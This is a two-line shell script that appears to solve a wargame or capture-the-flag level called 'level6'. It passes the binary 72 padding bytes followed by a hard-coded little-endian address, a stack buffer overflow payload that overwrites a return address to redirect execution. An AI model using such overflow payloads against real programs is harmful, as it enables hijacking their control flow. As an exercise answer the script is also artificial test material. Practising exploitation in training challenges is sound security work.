#!/bin/sh

./level6 `python -c 'print("A"*(64+8)+"\x54\x84\x04\x08")'`

exit 0
